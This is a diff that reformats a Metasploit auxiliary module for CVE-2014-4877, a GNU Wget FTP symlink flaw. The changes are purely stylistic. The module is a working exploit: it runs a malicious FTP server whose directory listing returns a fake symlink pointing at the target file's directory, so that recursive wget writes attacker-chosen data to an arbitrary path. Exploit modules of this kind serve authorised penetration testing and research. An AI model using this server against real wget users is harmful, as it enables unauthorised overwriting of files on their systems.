@@ -9,8 +9,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'GNU Wget FTP Symlink Arbitrary Filesystem Access',
-      'Description'    => %q{
+      'Name' => 'GNU Wget FTP Symlink Arbitrary Filesystem Access',
+      'Description' => %q{
         This module exploits a vulnerability in Wget when used in
         recursive (-r) mode with a FTP server as a destination. A
         symlink is used to allow arbitrary writes to the target's
@@ -20,28 +20,28 @@ class MetasploitModule < Msf::Auxiliary
         Tested successfully with wget 1.14. Versions prior to 1.16
         are presumed vulnerable.
       },
-      'Author'         => ['hdm'],
-      'License'        => MSF_LICENSE,
-      'Actions'        => [['Service', 'Description' => 'Run malicious FTP server']],
+      'Author' => ['hdm'],
+      'License' => MSF_LICENSE,
+      'Actions' => [['Service', 'Description' => 'Run malicious FTP server']],
       'PassiveActions' => ['Service'],
-      'References'     =>
-        [
-          [ 'CVE', '2014-4877'],
-          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1139181' ],
-          [ 'URL', 'https://www.rapid7.com/blog/post/2014/10/28/r7-2014-15-gnu-wget-ftp-symlink-arbitrary-filesystem-access' ]
-        ],
-      'DefaultAction'  => 'Service',
+      'References' => [
+        [ 'CVE', '2014-4877'],
+        [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1139181' ],
+        [ 'URL', 'https://www.rapid7.com/blog/post/2014/10/28/r7-2014-15-gnu-wget-ftp-symlink-arbitrary-filesystem-access' ]
+      ],
+      'DefaultAction' => 'Service',
       'DisclosureDate' => 'Oct 27 2014'
     )
 
     register_options(
       [
-        OptString.new('TARGET_FILE', [ true,  "The target file to overwrite", '/tmp/pwned' ]),
-        OptString.new('TARGET_DATA', [ true,  "The data to write to the target file", 'Hello from Metasploit' ]),
+        OptString.new('TARGET_FILE', [ true, "The target file to overwrite", '/tmp/pwned' ]),
+        OptString.new('TARGET_DATA', [ true, "The data to write to the target file", 'Hello from Metasploit' ]),
         OptPort.new('SRVPORT', [ true, "The port for the malicious FTP server to listen on", 2121])
-      ])
+      ]
+    )
 
-      @fakedir = Rex::Text.rand_text_alphanumeric(rand(8)+8)
+    @fakedir = Rex::Text.rand_text_alphanumeric(rand(8) + 8)
   end
 
   def run
@@ -50,19 +50,19 @@ class MetasploitModule < Msf::Auxiliary
     exploit()
   end
 
-  def on_client_command_user(c,arg)
+  def on_client_command_user(c, arg)
     @state[c][:user] = arg
     c.put "331 User name okay, need password...\r\n"
   end
 
-  def on_client_command_pass(c,arg)
+  def on_client_command_pass(c, arg)
     @state[c][:pass] = arg
     c.put "230 Login OK\r\n"
     @state[c][:auth] = true
     print_status("#{@state[c][:name]} Logged in with user '#{@state[c][:user]}' and password '#{@state[c][:user]}'...")
   end
 
-  def on_client_command_retr(c,arg)
+  def on_client_command_retr(c, arg)
     print_status("#{@state[c][:name]} -> RETR #{arg}")
 
     if not @state[c][:auth]
@@ -89,8 +89,7 @@ class MetasploitModule < Msf::Auxiliary
     print_good("#{@state[c][:name]} Hopefully wrote #{datastore['TARGET_DATA'].length} bytes to #{datastore['TARGET_FILE']}")
   end
 
-  def on_client_command_list(c,arg)
-
+  def on_client_command_list(c, arg)
     print_status("#{@state[c][:name]} -> LIST #{arg}")
 
     if not @state[c][:auth]
@@ -107,7 +106,7 @@ class MetasploitModule < Msf::Auxiliary
     pwd = @state[c][:cwd]
     buf = ''
 
-    dstamp = Time.at(Time.now.to_i-((3600*24*365)+(3600*24*(rand(365)+1)))).strftime("%b %e  %Y")
+    dstamp = Time.at(Time.now.to_i - ((3600 * 24 * 365) + (3600 * 24 * (rand(365) + 1)))).strftime("%b %e  %Y")
     unless pwd.index(@fakedir)
       buf << "lrwxrwxrwx   1 root     root           33 #{dstamp} #{@fakedir} -> #{::File.dirname(datastore['TARGET_FILE'])}\r\n"
       buf << "drwxrwxr-x  15 root     root         4096 #{dstamp} #{@fakedir}\r\n"
@@ -121,8 +120,7 @@ class MetasploitModule < Msf::Auxiliary
     conn.close
   end
 
-  def on_client_command_size(c,arg)
-
+  def on_client_command_size(c, arg)
     if not @state[c][:auth]
       c.put "500 Access denied\r\n"
       return
@@ -131,9 +129,7 @@ class MetasploitModule < Msf::Auxiliary
     c.put("213 #{datastore['TARGET_DATA'].length}\r\n")
   end
 
-
-  def on_client_command_cwd(c,arg)
-
+  def on_client_command_cwd(c, arg)
     print_status("#{@state[c][:name]} -> CWD #{arg}")
 
     if not @state[c][:auth]
